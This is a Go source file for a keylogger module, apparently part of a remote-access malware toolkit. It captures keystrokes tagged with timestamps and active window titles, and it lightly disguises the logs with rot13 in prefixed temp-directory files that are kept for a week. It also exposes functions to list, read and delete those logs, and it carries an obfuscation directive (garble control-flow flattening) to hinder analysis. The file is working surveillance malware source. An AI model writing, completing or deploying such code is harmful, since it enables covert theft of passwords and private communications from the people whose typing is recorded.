//go:build !nokeylogger
// +build !nokeylogger

package keylogger

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

const (
	MaxFileSize     = 10 * 1024 * 1024   // 10MB
	FileRetention   = 7 * 24 * time.Hour // 1 week
	FlushInterval   = 5 * time.Second
	FileNamePrefix  = "ovd-"
	InactivityPause = 2 * time.Second // Time before starting a new line
)

type Keylogger struct {
	mu                 sync.Mutex
	running            bool
	stopCh             chan struct{}
	buffer             strings.Builder
	currentFile        *os.File
	currentDate        string
	currentName        string
	logDir             string
	lastKeyTime        time.Time
	lineStarted        bool
	currentWindowTitle string
}

func New() *Keylogger {
	return &Keylogger{
		stopCh: make(chan struct{}),
		logDir: getTempDir(),
	}
}

func (k *Keylogger) Start() error {
	//garble:controlflow block_splits=max junk_jumps=max flatten_passes=max
	k.mu.Lock()
	if k.running {
		k.mu.Unlock()
		return fmt.Errorf("keylogger already running")
	}
	k.running = true
	k.mu.Unlock()

	log.Printf("[keylogger] Starting keylogger, logs in: %s", k.logDir)

	go k.cleanupOldLogs()
	go k.captureLoop()
	go k.flushLoop()

	return nil
}

func (k *Keylogger) Stop() {
	k.mu.Lock()
	defer k.mu.Unlock()

	if !k.running {
		return
	}

	k.running = false
	close(k.stopCh)

	if k.currentFile != nil {
		if k.lineStarted && k.buffer.Len() > 0 {
			k.buffer.WriteString("\n")
		}
		k.flushBuffer()
		k.currentFile.Close()
		k.currentFile = nil
	}

	log.Printf("[keylogger] Stopped")
}

func (k *Keylogger) ListFiles() ([]FileInfo, error) {
	entries, err := os.ReadDir(k.logDir)
	if err != nil {
		return nil, err
	}

	var files []FileInfo
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := entry.Name()
		if !strings.HasPrefix(name, FileNamePrefix) {
			continue
		}

		info, err := entry.Info()
		if err != nil {
			continue
		}

		files = append(files, FileInfo{
			Name: name,
			Size: info.Size(),
			Date: info.ModTime(),
		})
	}

	return files, nil
}

func (k *Keylogger) ReadFile(filename string) ([]byte, error) {
	if strings.Contains(filename, "..") || strings.Contains(filename, string(filepath.Separator)) {
		return nil, fmt.Errorf("invalid filename")
	}

	if !strings.HasPrefix(filename, FileNamePrefix) {
		return nil, fmt.Errorf("invalid filename prefix")
	}

	path := filepath.Join(k.logDir, filename)
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	return data, nil
}

func (k *Keylogger) ClearAll() error {
	k.mu.Lock()
	defer k.mu.Unlock()

	if k.currentFile != nil {
		k.currentFile.Close()
		k.currentFile = nil
		k.currentDate = ""
		k.currentName = ""
		k.buffer.Reset()
		k.lineStarted = false
	}

	entries, err := os.ReadDir(k.logDir)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := entry.Name()
		if !strings.HasPrefix(name, FileNamePrefix) {
			continue
		}

		path := filepath.Join(k.logDir, name)
		if err := os.Remove(path); err != nil {
			log.Printf("[keylogger] Failed to remove %s: %v", name, err)
		}
	}

	log.Printf("[keylogger] Cleared all log files")
	return nil
}

func (k *Keylogger) DeleteFile(filename string) error {
	if strings.Contains(filename, "..") || strings.Contains(filename, string(filepath.Separator)) {
		return fmt.Errorf("invalid filename")
	}

	if !strings.HasPrefix(filename, FileNamePrefix) {
		return fmt.Errorf("invalid filename prefix")
	}

	k.mu.Lock()
	defer k.mu.Unlock()

	if k.currentFile != nil && filename == k.currentName {
		k.currentFile.Close()
		k.currentFile = nil
		k.currentDate = ""
		k.currentName = ""
		k.buffer.Reset()
		k.lineStarted = false
	}

	path := filepath.Join(k.logDir, filename)
	if err := os.Remove(path); err != nil {
		return err
	}

	log.Printf("[keylogger] Deleted log file: %s", filename)
	return nil
}

func (k *Keylogger) FlushNow() {
	k.mu.Lock()
	defer k.mu.Unlock()

	if k.buffer.Len() > 0 {
		k.flushBuffer()
	}
}

func (k *Keylogger) captureLoop() {
	for {
		select {
		case <-k.stopCh:
			return
		default:
			if err := k.captureKeystrokes(); err != nil {
				log.Printf("[keylogger] Capture error: %v", err)
				time.Sleep(time.Second)
			}
		}
	}
}

func (k *Keylogger) flushLoop() {
	ticker := time.NewTicker(FlushInterval)
	defer ticker.Stop()

	for {
		select {
		case <-k.stopCh:
			return
		case <-ticker.C:
			k.mu.Lock()
			if k.buffer.Len() > 0 {
				if k.lineStarted && !k.lastKeyTime.IsZero() && time.Since(k.lastKeyTime) > InactivityPause {
					k.buffer.WriteString("\n")
					k.lineStarted = false
				}
				k.flushBuffer()
			}
			k.mu.Unlock()
		}
	}
}

func (k *Keylogger) flushBuffer() {
	if k.buffer.Len() == 0 {
		return
	}

	today := time.Now().Format("2006-01-02")
	if k.currentDate != today || k.currentFile == nil {
		k.rotateFile(today)
	}

	if k.currentFile != nil {
		info, err := k.currentFile.Stat()
		if err == nil && info.Size() >= MaxFileSize {
			k.rotateFile(today)
		}
	}

	if k.currentFile == nil {
		return
	}

	encrypted := rot13(k.buffer.String())
	if _, err := k.currentFile.WriteString(encrypted); err != nil {
		log.Printf("[keylogger] Write error: %v", err)
	}

	k.buffer.Reset()
}

func (k *Keylogger) rotateFile(date string) {
	if k.currentFile != nil {
		k.currentFile.Close()
	}

	timestamp := time.Now().Unix()
	filename := fmt.Sprintf("%s%s-%d.log", FileNamePrefix, date, timestamp)
	path := filepath.Join(k.logDir, filename)

	file, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		log.Printf("[keylogger] Failed to open log file: %v", err)
		k.currentFile = nil
		k.currentDate = ""
		return
	}

	k.currentFile = file
	k.currentDate = date
	k.currentName = filename
	log.Printf("[keylogger] Rotated to new file: %s", filename)
}

func (k *Keylogger) cleanupOldLogs() {
	cutoff := time.Now().Add(-FileRetention)

	entries, err := os.ReadDir(k.logDir)
	if err != nil {
		log.Printf("[keylogger] Failed to read log dir for cleanup: %v", err)
		return
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := entry.Name()
		if !strings.HasPrefix(name, FileNamePrefix) {
			continue
		}

		info, err := entry.Info()
		if err != nil {
			continue
		}

		if info.ModTime().Before(cutoff) {
			path := filepath.Join(k.logDir, name)
			if err := os.Remove(path); err != nil {
				log.Printf("[keylogger] Failed to remove old log %s: %v", name, err)
			} else {
				log.Printf("[keylogger] Removed old log: %s", name)
			}
		}
	}
}

func (k *Keylogger) logKey(key string) {
	k.mu.Lock()
	defer k.mu.Unlock()

	now := time.Now()

	needsNewLine := false
	if !k.lastKeyTime.IsZero() && now.Sub(k.lastKeyTime) > InactivityPause {
		needsNewLine = true
	}

	if key == "[ENTER]" {
		if k.lineStarted {
			k.buffer.WriteString("\n")
		}
		k.lineStarted = false
		k.lastKeyTime = now

		if k.buffer.Len() > 4096 {
			k.flushBuffer()
		}
		return
	}

	windowTitle := k.getWindowTitle()
	windowChanged := windowTitle != k.currentWindowTitle && windowTitle != ""

	if (needsNewLine || windowChanged) && k.lineStarted {
		k.buffer.WriteString("\n")
		k.lineStarted = false
	}

	if !k.lineStarted {
		timestamp := now.Format("2006-01-02 15:04:05")
		if windowChanged {
			k.currentWindowTitle = windowTitle
		}
		if k.currentWindowTitle != "" {
			k.buffer.WriteString(fmt.Sprintf("[%s] [%s] ", timestamp, k.currentWindowTitle))
		} else {
			k.buffer.WriteString(fmt.Sprintf("[%s] ", timestamp))
		}
		k.lineStarted = true
	}

	k.buffer.WriteString(key)
	k.lastKeyTime = now

	if k.buffer.Len() > 4096 {
		k.flushBuffer()
	}
}

func rot13(s string) string {
	var result strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z':
			result.WriteRune('a' + (r-'a'+13)%26)
		case r >= 'A' && r <= 'Z':
			result.WriteRune('A' + (r-'A'+13)%26)
		default:
			result.WriteRune(r)
		}
	}
	return result.String()
}

func getTempDir() string {
	return os.TempDir()
}

func (k *Keylogger) getWindowTitle() string {
	return getWindowTitle()
}

type FileInfo struct {
	Name string
	Size int64
	Date time.Time
}
